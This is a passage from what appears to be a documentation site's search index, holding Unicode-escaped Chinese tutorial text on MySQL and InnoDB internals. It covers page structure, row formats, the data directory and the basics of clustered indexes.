<p>\u8fd9\u4e24\u79cd\u65b9\u6cd5\u6267\u884c\u7684\u6548\u7387\u53ef\u80fd\u4e0d\u540c\uff0c\u4f18\u5316\u5668\u5c31\u662f\u7528\u6765\u51b3\u5b9a\u4f7f\u7528\u54ea\u79cd\u65b9\u6848\u66f4\u5408\u7406\u3002</p>"},{"location":"mysql/theory/#_6","title":"\u6267\u884c\u5668","text":"<p>\u6267\u884c\u65f6\uff0c\u5148\u53bb\u5224\u65ad\u8be5\u7528\u6237\u6709\u6ca1\u6709\u5bf9\u8fd9\u4e2a\u8868\u7684\u8981\u505a\u7684\u64cd\u4f5c\u7684\u6743\u9650\uff0c\u5982\u679c\u6ca1\u6709\u4f1a\u8fd4\u56de\u76f8\u5e94\u7684\u9519\u8bef\u3002\u6709\u6743\u9650\u7684\u8bdd\u5219\u6253\u5f00\u8868\u7ee7\u7eed\u6267\u884c\uff0c\u6267\u884c\u5668\u4f1a\u6839\u636e\u8868\u7684\u5f15\u64ce\u5b9a\u4e49\uff0c\u4f7f\u7528\u8fc7\u8fd9\u4e2a\u5f15\u64ce\u63d0\u4f9b\u7684\u63a5\u53e3\u6765\u6267\u884c\u3002</p>"},{"location":"mysql/theory/#innodb","title":"InnoDB","text":"<p><code>InnoDB</code>\u662f\u4e00\u4e2a\u5c06\u8868\u4e2d\u7684\u6570\u636e\u5b58\u50a8\u5230\u78c1\u76d8\u4e0a\u7684\u5b58\u50a8\u5f15\u64ce\uff0c\u771f\u6b63\u5904\u7406\u6570\u636e\u7684\u8fc7\u7a0b\u662f\u53d1\u751f\u5728\u5185\u5b58\u4e0a\u7684\uff0c\u6240\u4ee5\u9700\u8981\u628a\u6570\u636e\u4ece\u78c1\u76d8\u52a0\u8f7d\u5230\u5185\u5b58\u4e2d\uff0c\u5982\u679c\u662f\u5904\u7406\u5199\u5165\u6216\u66f4\u65b0\u65f6\uff0c\u8fd8\u9700\u8981\u628a\u5185\u5b58\u4e2d\u7684\u5185\u5bb9\u5199\u56de\u78c1\u76d8\u4e2d\u3002<code>InnoDB</code>\u5c06\u6570\u636e\u5212\u5206\u4e3a\u82e5\u5e72\u4e2a\u9875\uff0c\u6bcf\u9875\u5927\u5c0f\u4e3a16KB\uff0c\u4ee5\u9875\u505a\u4e3a\u786c\u76d8\u548c\u5185\u5b58\u4ea4\u4e92\u7684\u57fa\u672c\u5355\u4f4d\uff0c\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u6bcf\u6b21\u81f3\u5c11\u4f1a\u8bfb\u53d6\u6216\u5199\u56de16KB\u7684\u5185\u5bb9\u3002</p>"},{"location":"mysql/theory/#_7","title":"\u6570\u636e\u9875","text":"<p>\u8fd9\u4e9b\u9875\u6709\u5f88\u591a\u7684\u79cd\u7c7b\uff0c\u4f8b\u5982\u5b58\u653e\u7a7a\u95f4\u5934\u90e8\u4fe1\u606f\u7684\u9875\u3001\u5b58\u653e\u65e5\u5fd7\u4fe1\u606f\u7684\u9875\u7b49\u7b49\u3002\u6211\u4eec\u5148\u6765\u4e86\u89e3\u5b58\u653e\u8bb0\u5f55\u7684\u9875\uff0c\u4e5f\u5c31\u662f\u6570\u636e\u9875\uff0c\u5b98\u65b9\u79f0\u4e3a\u200b\u7d22\u5f15\u9875\u3002</p> <p>\u6570\u636e\u9875\u88ab\u5206\u4e3a7\u4e2a\u90e8\u5206\uff0c\u6709\u7684\u90e8\u5206\u5360\u7528\u56fa\u5b9a\u5927\u5c0f\u7684\u7a7a\u95f4\uff0c\u6709\u7684\u4e0d\u56fa\u5b9a:</p> \u540d\u79f0 \u4e2d\u6587\u540d \u5360\u7528\u7a7a\u95f4 \u7b80\u5355\u63cf\u8ff0 <code>File Header</code> \u6587\u4ef6\u5934\u90e8 <code>38</code>\u5b57\u8282 \u9875\u7684\u4e00\u4e9b\u901a\u7528\u4fe1\u606f <code>Page Header</code> \u9875\u9762\u5934\u90e8 <code>56</code>\u5b57\u8282 \u6570\u636e\u9875\u4e13\u6709\u7684\u4e00\u4e9b\u4fe1\u606f <code>Infimum + Supremum</code> \u6700\u5c0f\u548c\u6700\u5927\u8bb0\u5f55 <code>26</code>\u5b57\u8282 \u4e24\u4e2a\u865a\u62df\u7684\u884c\u8bb0\u5f55 <code>User Records</code> \u7528\u6237\u8bb0\u5f55 \u4e0d\u786e\u5b9a \u5b9e\u9645\u5b58\u50a8\u7684\u884c\u8bb0\u5f55\u5185\u5bb9 <code>Free Space</code> \u7a7a\u95f2\u7a7a\u95f4 \u4e0d\u786e\u5b9a \u9875\u4e2d\u5c1a\u672a\u4f7f\u7528\u7684\u7a7a\u95f4 <code>Page Directory</code> \u9875\u9762\u76ee\u5f55 \u4e0d\u786e\u5b9a \u9875\u4e2d\u7684\u67d0\u4e9b\u8bb0\u5f55\u7684\u76f8\u5bf9\u4f4d\u7f6e <code>File Trailer</code> \u6587\u4ef6\u5c3e\u90e8 <code>8</code>\u5b57\u8282 \u6821\u9a8c\u9875\u662f\u5426\u5b8c\u6574 <p>\u5728\u2eda\u76847\u4e2a\u7ec4\u6210\u90e8\u5206\u4e2d\uff0c\u6211\u4eec\u81ea\u5df1\u5b58\u50a8\u7684\u8bb0\u5f55\u4f1a\u6309\u7167\u6211\u4eec\u6307\u5b9a\u7684\u884c\u683c\u5f0f\u5b58\u50a8\u5230User Records\u4e2d\u3002\u4f46\u5728\u4e00\u5f00\u59cb\u751f\u6210\u2eda\u7684\u65f6\u5019\uff0c\u5176\u5b9e\u5e76\u6ca1\u6709User Records\u8fd9\u4e2a\u90e8\u5206\uff0c\u6bcf\u5f53\u6211\u4eec\u63d2\u5165\u4e00\u6761\u8bb0\u5f55\uff0c\u90fd\u4f1a\u4eceFree Space\u4e2d\u7533\u8bf7\u4e00\u4e2a\u8bb0\u5f55\u5927\u5c0f\u7684\u7a7a\u95f4\u5212\u5206\u5230User Records\uff0c\u5f53Free Space\u7684\u7a7a\u95f4\u5168\u90e8\u88ab\u66ff\u6362\u6389\u540e\uff0c\u4e5f\u5c31\u610f\u5473\u7740\u8fd9\u4e2a\u2eda\u4f7f\u7528\u5b8c \u4e86\uff0c\u5982\u679c\u8fd8\u6709\u65b0\u7684\u8bb0\u5f55\u63d2\u5165\u7684\u8bdd\uff0c\u5c31\u9700\u8981\u53bb\u7533\u8bf7\u65b0\u7684\u2eda\u4e86\u3002</p> <p>\u6bcf\u6761\u8bb0\u5f55\u7684\u5934\u4fe1\u606f\u4e2d\u6709\u4e00\u4e2a<code>next_record</code>\u5c5e\u6027\uff0c\u4ece\u800c\u4f7f\u9875\u4e2d\u7684\u6570\u636e\u4e32\u8054\u6210\u4e00\u4e2a\u5355\u94fe\u8868\uff0c\u94fe\u8868\u4e2d\u7684\u5404\u4e2a\u8282\u70b9\u6309\u4e3b\u952e\u7684\u503c\u7531\u5c0f\u5230\u5927\u8fde\u63a5\u8d77\u6765\u3002Innodb\u4f1a\u628a\u8fd9\u4e9b\u8bb0\u5f55\u5206\u6210\u82e5\u5e72\u4e2a\u4e0d\u540c\u7684\u7ec4\uff0c\u6bcf\u7ec4\u7684\u6700\u540e\u4e00\u6761\u8bb0\u5f55\u7684\u5730\u5740\u504f\u79fb\u91cf\u4f1a\u5b58\u653e\u5728<code>Page Directory</code>\u4e2d\uff0c\u8fd9\u6837\u901a\u8fc7\u4e3b\u952e\u5728\u4e00\u4e2a\u9875\u4e2d\u67e5\u627e\u5230\u4e00\u6761\u8bb0\u5f55\u5c31\u4f1a\u975e\u5e38\u7684\u5feb\uff0c\u9996\u5148\u901a\u8fc7\u4e8c\u5206\u6cd5\u67e5\u5230\u5b83\u5e94\u8be5\u5728\u54ea\u4e2a\u7ec4\u4e2d\uff0c\u63a5\u7740\u904d\u5386\u8fd9\u4e2a\u7ec4\u627e\u5230\u76f8\u5e94\u7684\u8bb0\u5f55\u3002</p> <p><code>File Header</code>\u4e3b\u8981\u5b58\u4e86\u4e0a\u4e00\u9875\u548c\u4e0b\u4e00\u9875\u7684\u7f16\u53f7\uff0c\u4f7f\u5f97\u6240\u6709\u7684\u6570\u636e\u9875\u6784\u6210\u4e00\u4e2a\u53cc\u5411\u94fe\u8868\u3002\u800c<code>File Trailer</code>\u4f1a\u52a0\u5165\u4e00\u4e9b\u6548\u9a8c\u503c\uff0c\u4ee5\u4fdd\u8bc1\u4ece\u5185\u5b58\u81f3\u786c\u76d8\u540c\u6b65\u6570\u636e\u7684\u5b8c\u6574\u6027\u3002</p>"},{"location":"mysql/theory/#_8","title":"\u884c\u683c\u5f0f","text":"<p>\u6bcf\u6761\u7528\u6237\u8bb0\u5f55\u5728\u78c1\u76d8\u4e0a\u7684\u5b58\u653e\u65b9\u5f0f\u4e5f\u88ab\u79f0\u4e3a\u200b\u884c\u683c\u5f0f\u200b\u6216\u200b\u8bb0\u5f55\u683c\u5f0f\u200b\uff0c\u884c\u683c\u5f0f\u88ab\u5206\u4e3a\u56db\u79cd\uff0c\u5373<code>Compact</code>\u3001<code>Redundant</code>\u3001<code>Dynamic</code>\u548c<code>Compressed</code>\u3002\u5b83\u4eec\u539f\u7406\u4e0a\u5927\u4f53\u76f8\u540c\uff0c\u6240\u4ee5\u6211\u4eec\u4ee5Compact\u683c\u5f0f\u4e3a\u4f8b\u6765\u8be6\u7ec6\u4e86\u89e3\u4e00\u4e0b\u3002</p> <p>\u5982\u56fe\u6240\u793a\uff0c\u6bcf\u6761\u8bb0\u5f55\u88ab\u5206\u4e3a\u4e24\u4e2a\u90e8\u5206\uff0c\u8bb0\u5f55\u7684\u771f\u5b9e\u6570\u636e\u548c\u8bb0\u5f55\u7684\u989d\u5916\u4fe1\u606f\u3002 </p> <p>Mysql\u652f\u6301\u4e00\u4e9b\u53d8\u957f\u7684\u6570\u636e\u7c7b\u578b\uff0c\u5982VARCHAR\u3001\u5404\u79cdTEXT\u3001\u5404\u79cdBLOB\u7b49\u7c7b\u578b\uff0c\u5bf9\u4e8e\u8fd9\u7c7b\u53d8\u957f\u5b57\u6bb5\uff0c\u9664\u4e86\u5b58\u653e\u5b83\u4eec\u771f\u6b63\u7684\u6570\u636e\u5185\u5bb9\uff0c\u8fd8\u9700\u8981\u5b58\u5b83\u4eec\u5360\u7528\u4e86\u591a\u5927\u7a7a\u95f4\uff0c\u5728Compact\u4e2d\uff0c\u4f1a\u628a\u5b83\u4eec\u5360\u7528\u591a\u5927\u7a7a\u95f4\u6309\u5217\u7684\u9006\u5e8f\u5b58\u653e\u5728\u6bcf\u6761\u8bb0\u5f55\u7684\u5934\u90e8\u3002\u6240\u4ee5\u7b2c\u4e00\u90e8\u5206\u5c31\u662f\u53d8\u957f\u5b57\u6bb5\u957f\u5ea6\u5217\u8868\uff0c\u5b83\u53ea\u5b58\u975eNULL\u503c\u7684\u53d8\u957f\u5b57\u6bb5\u7684\u5217\uff0c\u5982\u679c\u8868\u4e2d\u6ca1\u6709\u53d8\u957f\u5b57\u6bb5\uff0c\u90a3\u5c31\u6ca1\u6709\u8fd9\u4e00\u90e8\u5206\u3002\u4f46\u662f\u5982\u679c\u5f53\u524d\u8868\u91c7\u7528\u7684\u5b57\u7b26\u96c6\u662f\u53d8\u957f\u5b57\u7b26\u96c6\uff0c\u90a3\u4e48\u5bf9\u4e8eCHAR\u7c7b\u578b\u7684\u5b57\u6bb5\u6240\u5360\u7528\u7684\u7a7a\u95f4\u4e5f\u4f1a\u88ab\u52a0\u5165\u5230\u53d8\u957f\u5b57\u6bb5\u957f\u5ea6\u5217\u8868\u4e2d\u3002</p> <p>\u4e3a\u4e86\u8ba9NULL\u503c\u4e0d\u5360\u7528\u8fc7\u591a\u7684\u7a7a\u95f4\uff0cCompact\u628aNULL\u503c\u7684\u5217\u7edf\u4e00\u7ba1\u7406\u5728\u4e00\u4e2a\u5730\u65b9\u3002\u5b83\u9996\u5148\u4f1a\u7edf\u8ba1\u8868\u4e2d\u54ea\u4e9b\u5217\u5141\u8bb8\u6709NULL\u503c\uff0c\u5373\u5ffd\u7565\u6389\u4e3b\u952e\u5217\u548c\u88ab<code>NOT NULL</code>\u4fee\u9970\u7684\u5217\uff1b\u5176\u6b21\u5c06\u8fd9\u4e9b\u7edf\u8ba1\u51fa\u6765\u7684\u5217\u9006\u5e8f\u7684\u5bf9\u5e94\u4e00\u4e2a\u4e2a\u4e8c\u8fdb\u5236\u4f4d\uff0c\u6bcf\u4f4d\u4e3a1\u65f6\u5c31\u4ee3\u8868\u8fd9\u5217\u5f53\u524d\u7684\u503c\u4e3aNULL\u3002\u540c\u6837\u7684\uff0c\u82e5\u8868\u4e2d\u6ca1\u6709\u5141\u8bb8\u5b58\u50a8NULL\u7684\u5217\uff0c\u90a3\u4e48\u8fd9\u90e8\u5206\u4e5f\u4e0d\u5b58\u5728\u3002</p> <p>\u800c\u8bb0\u5f55\u7684\u5934\u4fe1\u606f\u90fd\u662f\u4e00\u4e9b\u4e8c\u8fdb\u5236\u4f4d\uff0c\u5171\u8ba140\u4f4d:</p> \u540d\u79f0 \u5927\u5c0f(bit) \u63cf\u8ff0 <code>\u9884\u7559\u4f4d1</code> <code>1</code> \u6ca1\u6709\u4f7f\u7528 <code>\u9884\u7559\u4f4d2</code> <code>1</code> \u6ca1\u6709\u4f7f\u7528 <code>delete_mask</code> <code>1</code> \u6807\u8bb0\u8be5\u8bb0\u5f55\u662f\u5426\u88ab\u5220\u9664 <code>min_rec_mask</code> <code>1</code> B+\u6811\u7684\u6bcf\u5c42\u975e\u53f6\u5b50\u8282\u70b9\u4e2d\u7684\u6700\u5c0f\u8bb0\u5f55\u90fd\u4f1a\u6dfb\u52a0\u8be5\u6807\u8bb0 <code>n_owned</code> <code>4</code> \u8868\u793a\u5f53\u524d\u8bb0\u5f55\u62e5\u6709\u7684\u8bb0\u5f55\u6570 <code>heap_no</code> <code>13</code> \u8868\u793a\u5f53\u524d\u8bb0\u5f55\u5728\u8bb0\u5f55\u5806\u7684\u4f4d\u7f6e\u4fe1\u606f <code>record_type</code> <code>3</code> \u8868\u793a\u5f53\u524d\u8bb0\u5f55\u7684\u7c7b\u578b <code>next_record</code> <code>16</code> \u8868\u793a\u4e0b\u4e00\u6761\u8bb0\u5f55\u7684\u76f8\u5bf9\u4f4d\u7f6e <p>\u5bf9\u4e8e\u8bb0\u5f55\u7684\u771f\u5b9e\u6570\u636e\u90e8\u5206\uff0cMysql\u4f1a\u4e3a\u6bcf\u6761\u8bb0\u5f55\u9ed8\u8ba4\u7684\u6dfb\u52a0\u4e00\u4e9b\u5217\uff0c\u4e5f\u5c31\u662f\u9690\u85cf\u5217\uff0c\u5305\u62ec:</p> \u5217\u540d \u662f\u5426\u5fc5\u987b \u5360\u7528\u7a7a\u95f4 \u63cf\u8ff0 <code>DB_ROW_ID</code> \u5426 <code>6</code>\u5b57\u8282 \u884cID\uff0c\u552f\u4e00\u6807\u8bc6\u4e00\u6761\u8bb0\u5f55 <code>DB_TRX_ID</code> \u662f <code>6</code>\u5b57\u8282 \u4e8b\u52a1ID <code>DB_ROLL_PTR</code> \u662f <code>7</code>\u5b57\u8282 \u56de\u6eda\u6307\u9488 <p>\u5bf9\u4e8e\u4e3b\u952e\uff0c\u4f18\u5148\u4f7f\u7528\u7528\u6237\u5b9a\u4e49\u7684\uff0c\u5982\u679c\u672a\u5b9a\u4e49\u5219\u9009\u53d6\u4e00\u4e2a<code>Unique</code>\u952e\u4f5c\u4e3a\u4e3b\u952e\uff0c\u5982\u679c\u6ca1\u6709<code>Unique</code>\u952e\u5219\u4f1a\u6dfb\u52a0\u4e00\u4e2a<code>DB_ROW_ID</code>\u7684\u9690\u85cf\u5217\u4f5c\u4e3a\u4e3b\u952e\uff0c\u6240\u4ee5\u8fd9\u4e2a\u9690\u85cf\u5217\u53ef\u80fd\u4e0d\u5b58\u5728\u3002</p> <p>\u4e4b\u524d\u63d0\u5230\u4e00\u4e2a\u6570\u636e\u9875\u53ea\u670916KB\uff0c\u4e5f\u5c31\u662f16384\u5b57\u8282\uff0c\u800cVARCHAR\u3001CHAR\u3001TEXT\u3001BLOB\u7b49\u5b57\u6bb5\u90fd\u6709\u53ef\u80fd\u5927\u4e8e\u5b83\uff0c\u8fd9\u5c31\u9020\u6210\u4e86\u4e00\u4e2a\u9875\u5b58\u653e\u4e0d\u4e86\u4e00\u6761\u8bb0\u5f55\u7684\u60c5\u51b5\u3002\u6211\u4eec\u628a\u8fd9\u79cd\u73b0\u8c61\u79f0\u4e3a\u884c\u6ea2\u51fa\u3002\u5bf9\u4e8e\u8fd9\u79cd\u60c5\u51b5\uff0cCompact\u4f1a\u5728\u8bb0\u5f55\u7684\u771f\u5b9e\u6570\u636e\u90e8\u5206\u53ea\u5b58\u50a8\u8fd9\u6761\u8bb0\u5f55\u7684\u4e00\u90e8\u5206\uff0c\u5269\u4f59\u7684\u6570\u636e\u5206\u6563\u5728\u5176\u4ed6\u7684\u9875\u4e2d\uff0c\u7136\u540e\u771f\u5b9e\u6570\u636e\u90e8\u5206\u8fd8\u670920\u4e2a\u5b57\u8282\u6307\u5411\u8fd9\u4e9b\u9875\u7684\u5730\u5740\u3002Dynamic\u3001Compressed\u7684\u884c\u683c\u5f0f\u548cCompact\u5f88\u50cf\uff0c\u53ea\u662f\u5728\u5904\u7406\u884c\u6ea2\u51fa\u65f6\u6709\u4e9b\u4e0d\u540c\u7f62\u4e86\uff0c\u5b83\u4eec\u53ea\u5728\u8bb0\u5f55\u7684\u771f\u5b9e\u6570\u636e\u5904\u5b58\u5176\u4ed6\u9875\u9762\u7684\u5730\u5740\uff0c\u6570\u636e\u90fd\u5728\u5176\u4ed6\u9875\u9762\u3002Compressed\u91c7\u7528\u538b\u7f29\u7b97\u6cd5\u5bf9\u9875\u9762\u8fdb\u884c\u538b\u7f29\u4ee5\u8282\u7701\u7a7a\u95f4\u3002Mysql5.7\u9ed8\u8ba4\u7684\u884c\u683c\u5f0f\u5c31\u662fDynamic\uff0cRedundant\u5c5e\u4e8eMysql5.0\u4e4b\u524d\u7684\u5feb\u88ab\u6dd8\u6c70\u7684\u683c\u5f0f\u3002</p>"},{"location":"mysql/theory/#_9","title":"\u6570\u636e\u76ee\u5f55","text":"<p>InnoDB\u3001MyISAM\u8fd9\u6837\u7684\u5b58\u50a8\u5f15\u64ce\u4f1a\u628a\u6570\u636e\u5b58\u50a8\u5728\u786c\u76d8\u4e0a\u7684\u6570\u636e\u76ee\u5f55\u4e2d\uff0c\u5b83\u4e0d\u662f\u5b89\u88c5\u76ee\u5f55\uff0c\u53ef\u901a\u8fc7\u5982\u4e0b\u547d\u4ee4\u67e5\u770b: <pre><code>mysql&gt; SHOW VARIABLES LIKE 'datadir';\n+---------------+-----------------------+\n| Variable_name | Value                 |\n+---------------+-----------------------+\n| datadir       | /usr/local/var/mysql/ |\n+---------------+-----------------------+\n1 row in set (0.00 sec)\n</code></pre></p> <p>\u5728\u8fd9\u4e2a\u76ee\u5f55\u4e2d\uff0c\u6211\u4eec\u6bcf\u65b0\u5efa\u4e00\u4e2a\u65b0\u7684\u6570\u636e\u5e93\uff0cMysql\u4f1a\u5e2e\u6211\u4eec\u521b\u5efa\u4e00\u4e2a\u540c\u540d\u7684\u6587\u4ef6\u5939\uff0c\u5e76\u5728\u8be5\u6587\u4ef6\u5939\u5185\u521b\u5efa\u4e00\u4e2a<code>db.opt</code>\u7684\u6587\u4ef6\uff0c\u5b83\u5305\u542b\u4e86\u8fd9\u4e2a\u6570\u636e\u5e93\u7684\u5c5e\u6027\uff0c\u4f8b\u5982\u6570\u636e\u5e93\u7684\u5b57\u7b26\u96c6\u548c\u6bd4\u8f83\u89c4\u5219\u7b49\u3002\u4e4b\u540e\u6211\u4eec\u5728\u67d0\u6570\u636e\u5e93\u521b\u5efa\u4e00\u4e2a\u8868\u65f6\uff0cMysql\u4f1a\u4e3a\u6211\u4eec\u521b\u5efa\u4e00\u4e2a<code>\u8868\u540d.frm</code>\u7684\u6587\u4ef6\uff0c\u5b83\u5b58\u50a8\u4e86\u8868\u7ed3\u6784\u7684\u5b9a\u4e49\uff1bInnoDB\u4f1a\u4e3a\u6211\u4eec\u521b\u5efa\u4e00\u4e2a<code>\u8868\u540d.ibd</code>\u7684\u6587\u4ef6\uff0c\u5b83\u662f\u4e00\u4e2a\u72ec\u7acb\u7684\u8868\u7a7a\u95f4\u6587\u4ef6\uff0c\u5b58\u50a8\u4e86\u4e00\u9875\u9875\u7684\u6570\u636e\u3002</p> <p>Mysql\u6709\u56db\u4e2a\u7cfb\u7edf\u5e93\uff0c\u4f46information_schema\u5e93\u88ab\u7279\u6b8a\u5bf9\u5f85\uff0c\u6ca1\u6709\u76f8\u5e94\u7684\u6587\u4ef6\u5939\uff0c\u5b83\u4fdd\u5b58\u7740MySQL\u670d\u52a1\u5668\u7ef4\u62a4\u7684\u6240\u6709\u5176\u4ed6\u6570\u636e\u5e93\u7684\u4fe1\u606f\uff0c\u6bd4\u5982\u6709\u54ea\u4e9b\u8868\u3001\u54ea\u4e9b\u89c6\u56fe\u3001\u54ea\u4e9b\u89e6\u53d1\u5668\u3001\u54ea\u4e9b\u5217\u3001\u54ea\u4e9b\u7d22\u5f15\uff0c\u90fd\u662f\u4e00\u4e9b\u5143\u6570\u636e\uff1bmysql\u5e93\u5b58\u50a8\u4e86MySQL\u7684\u7528\u6237\u8d26\u6237\u548c\u6743\u9650\u4fe1\u606f\uff0c\u4e00\u4e9b\u5b58\u50a8\u8fc7\u7a0b\u3001\u4e8b\u4ef6\u7684\u5b9a\u4e49\u4fe1\u606f\uff0c\u4e00\u4e9b\u8fd0\u884c\u8fc7\u7a0b\u4e2d\u4ea7\u751f\u7684\u65e5\u5fd7\u4fe1\u606f\uff0c\u4e00\u4e9b\u5e2e\u52a9\u4fe1\u606f\u4ee5\u53ca\u65f6\u533a\u4fe1\u606f\u7b49\uff1bperformance_schema\u5e93\u4e3b\u8981\u4fdd\u5b58MySQL\u670d\u52a1\u5668\u8fd0\u884c\u8fc7\u7a0b\u4e2d\u7684\u4e00\u4e9b\u72b6\u6001\u4fe1\u606f\uff0c\u7b97\u662f\u5bf9MySQL\u670d\u52a1\u5668\u7684\u4e00\u4e2a\u6027\u80fd\u76d1\u63a7\uff0c\u5305\u62ec\u7edf\u8ba1\u6700\u8fd1\u6267\u884c\u4e86\u54ea\u4e9b\u8bed\u53e5\uff0c\u5728\u6267\u884c\u8fc7\u7a0b\u7684\u6bcf\u4e2a\u9636\u6bb5\u90fd\u8bdd\u8d39\u4e86\u591a\u2ed3\u65f6\u95f4\uff0c\u5185\u5b58\u7684\u4f7f\u7528\u60c5\u51b5\u7b49\uff1bsys\u5e93\u4e3b\u8981\u662f\u901a\u8fc7\u89c6\u56fe\u7684\u5f62\u5f0f\u628ainformation_schema\u548cperformance_schema\u7ed3\u5408\u8d77\u6765\uff0c\u8ba9\u7a0b\u5e8f\u5458\u53ef\u4ee5\u66f4\u65b9\u4fbf\u7684\u4e86\u89e3MySQL\u670d\u52a1\u5668\u7684\u4e00\u4e9b\u6027\u80fd\u4fe1\u606f\u3002</p> <p>\u6b64\u5916\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cInnoDB\u8fd8\u4f1a\u5728\u8be5\u76ee\u5f55\u4e0b\u521b\u5efa<code>ibdata1</code>\u8fd9\u6837\u4e00\u4e2a\u6587\u4ef6\uff0c\u8868\u793a\u7cfb\u7edf\u8868\u7a7a\u95f4\u3002MySQL5.5.7\u5230MySQL5.6.6\u4e4b\u95f4\u7684\u5404\u7248\u672c\uff0c\u8868\u4e2d\u7684\u6570\u636e\u90fd\u4f1a\u88ab\u9ed8\u8ba4\u5b58\u50a8\u5230\u8fd9\u4e2a\u7cfb\u7edf\u8868\u7a7a\u95f4\u3002\u8be5\u76ee\u5f55\u4e0b\u8fd8\u5305\u542b\u670d\u52a1\u5668\u8fdb\u7a0b\u6587\u4ef6\uff0c\u670d\u52a1\u5668\u65e5\u5fd7\u6587\u4ef6\uff0c\u81ea\u52a8\u751f\u6210\u7684RSA\u3001SSL\u8bc1\u4e66\u548c\u5bc6\u94a5\u6587\u4ef6\u7b49\u3002</p> <p>Mysql\u7684\u89c6\u56fe\u662f\u865a\u62df\u8868\uff0c\u4e5f\u4f1a\u5728\u5bf9\u5e94\u7684\u5e93\u6587\u4ef6\u5939\u4e0b\u521b\u5efa\u4e00\u4e2afrm\u6587\u4ef6\u5b58\u50a8\u3002</p>"},{"location":"mysql/theory/#_10","title":"\u8868\u7a7a\u95f4","text":""},{"location":"mysql/theory/#_11","title":"\u7d22\u5f15","text":"<p>\u5728\u6ca1\u6709\u7d22\u5f15\u7684\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u65e0\u6cd5\u5feb\u901f\u5b9a\u4f4d\u5230\u6570\u636e\u6240\u5728\u7684\u9875\uff0c\u53ea\u80fd\u4ece\u7b2c\u4e00\u4e2a\u9875\u6cbf\u7740\u53cc\u5411\u94fe\u8868\u4f9d\u6b21\u5411\u4e0b\u627e\u6bcf\u4e2a\u9875\uff0c\u5728\u6bcf\u4e2a\u9875\u4e2d\u5982\u679c\u67e5\u627e\u7684\u4e0d\u662f\u4e3b\u952e\uff0c\u8fd8\u5f97\u4f9d\u6b21\u53bb\u6bd4\u5bf9\u6bcf\u6761\u8bb0\u5f55\u3002\u663e\u7136\uff0c\u8fd9\u79cd\u67e5\u8be2\u6548\u7387\u662f\u975e\u5e38\u4f4e\u7684\u3002</p>"},{"location":"mysql/theory/#_12","title":"\u805a\u7c07\u7d22\u5f15","text":"<p>\u6211\u4eec\u5148\u6765\u8003\u8651\u4e00\u79cd\u7b80\u5355\u7684\u7d22\u5f15\u65b9\u5f0f\uff0c\u5148\u628a\u9875\u7684\u7ed3\u6784\u7b80\u5316\u6765\u770b\u3002</p> <p></p> <p>\u6570\u636e\u9875\u4e2d\u6211\u4eec\u6682\u65f6\u8ba4\u4e3a\u6bcf\u9875\u5b58\u50a8\u4e09\u6761\u8bb0\u5f55\u5c31\u6ee1\u4e86\uff0c\u6bcf\u6761\u8bb0\u5f55\u6211\u4eec\u53ea\u5173\u6ce8record_type\uff0c0\u8868\u793a\u666e\u901a\u8bb0\u5f55\uff0c2\u8868\u793a\u6700\u5c0f\u8bb0\u5f55\uff0c3\u8868\u793a\u6700\u5927\u8bb0\u5f55\uff0c\u4ee5\u53canext_record\u8868\u793a\u4e0b\u4e00\u6761\u8bb0\u5f55\u3002</p> <p>\u63a5\u4e0b\u6765\u5bf9\u4e8e\u6570\u636e\u7684\u589e\u5220\u6539\u64cd\u4f5c\uff0c\u6211\u4eec\u5fc5\u987b\u901a\u8fc7\u4e00\u4e9b\u8bf8\u5982\u8bb0\u5f55\u79fb\u52a8\u7684\u64cd\u4f5c\u6765\u59cb\u7ec8\u4fdd\u8bc1\u8fd9\u4e2a\u72b6\u6001\u4e00\u76f4\u6210\u7acb:\u4e0b\u4e00\u4e2a\u6570\u636e\u2eda\u4e2d\u7528\u6237\u8bb0\u5f55\u7684\u4e3b\u952e\u503c\u5fc5\u987b\u5927\u4e8e\u4e0a\u4e00\u4e2a\u2eda\u4e2d\u7528\u6237\u8bb0\u5f55\u7684\u4e3b\u952e\u503c\u3002\u8fd9\u4e2a\u8fc7\u7a0b\u79f0\u4e3a\u200b\u2eda\u5206\u88c2\u3002\u6709\u4e86\u8fd9\u4e2a\u72b6\u6001\u7684\u4fdd\u8bc1\uff0c\u6211\u4eec\u53ef\u4ee5\u7ed9\u6bcf\u4e2a\u9875\u5efa\u7acb\u4e00\u4e2a\u76ee\u5f55\u9879\uff0c\u6bcf\u4e2a\u76ee\u5f55\u9879\u5305\u62ec\u5176\u5bf9\u5e94\u7684\u9875\u53f7\u4ee5\u53ca\u9875\u4e2d\u7528\u6237\u8bb0\u5f55\u7684\u6700\u5c0f\u7684\u4e3b\u952e\u503c\uff0c\u5927\u6982\u662f\u8fd9\u6837\u7684:</p> <p></p> <p>\u8fd9\u5f62\u6210\u4e86\u4e00\u4e2a\u7b80\u5355\u7684\u7d22\u5f15\u65b9\u6848\uff0c\u6211\u4eec\u628a\u8fd9\u4e9b\u76ee\u5f55\u9879\u653e\u5230\u4e00\u4e2a\u6570\u7ec4\u4e2d\uff0c\u5f53\u901a\u8fc7\u4e3b\u952e\u67e5\u627e\u65f6\u5c31\u80fd\u901a\u8fc7\u8fd9\u4e2a\u6570\u7ec4\u627e\u5230\u5bf9\u5e94\u7684\u6570\u636e\u9875\uff0c\u5728\u6839\u636e\u6570\u636e\u9875\u7684Page Directory\u548c\u4e8c\u5206\u6cd5\u5c31\u53ef\u4ee5\u8fc5\u901f\u627e\u5230\u8bb0\u5f55\u3002</p> <p>\u8fd9\u4e2a\u65b9\u6848\u7684\u95ee\u9898\u662f\u6211\u4eec\u9700\u8981\u4e00\u6bb5\u8fde\u7eed\u7684\u7269\u7406\u7a7a\u95f4\u6765\u653e\u8fd9\u4e2a\u5b58\u50a8\u76ee\u5f55\u9879\u7684\u6570\u7ec4\uff0c\u4f46Mysql\u53ea\u80fd\u4fdd\u8bc1\u9875\u7684\u6570\u636e\u662f\u8fde\u7eed\u7684\uff0c\u537316KB\u7684\u8fde\u7eed\u7a7a\u95f4\u3002\u968f\u7740\u8868\u4e2d\u7684\u6570\u636e\u8d8a\u6765\u8d8a\u591a\uff0c\u591a\u523016KB\u6839\u672c\u653e\u4e0d\u4e0b\u8fd9\u4e9b\u76ee\u5f55\u9879\u600e\u4e48\u529e\uff1f\u53e6\u4e00\u4e2a\u95ee\u9898\u662f\u5982\u679c\u6211\u4eec\u5220\u9664\u6570\u636e\u8bb0\u5f55\u4f7f\u5f97\u67d0\u4e00\u9875\u4e2d\u6ca1\u6709\u5185\u5bb9\uff0c\u90a3\u4e48\u